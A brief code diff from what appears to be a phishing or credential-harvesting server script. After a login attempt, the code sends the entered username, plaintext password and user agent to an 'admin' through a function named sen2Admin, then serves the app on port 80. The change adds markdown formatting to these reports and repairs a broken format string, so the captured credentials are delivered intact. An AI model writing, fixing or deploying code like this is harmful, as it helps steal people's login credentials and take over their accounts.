@@ -56,11 +56,11 @@ if __name__ == "__main__":
     if ok:
         print(get_timestamp(), "Login Success")
         sen2Admin(
-            'LoginSuccess: '+status+'\nUsername: '+username+'\nPassword: '+password+'\nUseragent: '+useragent)
+            '**LoginSuccess:** '+status+'\n**Username:** '+username+'\n**Password:** '+password+'\nUseragent: '+useragent)
 
     else:
         print("[X]", get_timestamp(), "Login failed")
         sen2Admin(
-            'LoginFailed: {status}\nUsername: {username}\nPassword: {password}\nUseragent: {useragent}')
+            '**LoginFailed:** '+status+'\n**Username:** '+username+'\n**Password:** '+password+'\nUseragent: '+useragent)
 
     serve(app, host="0.0.0.0", port=80)
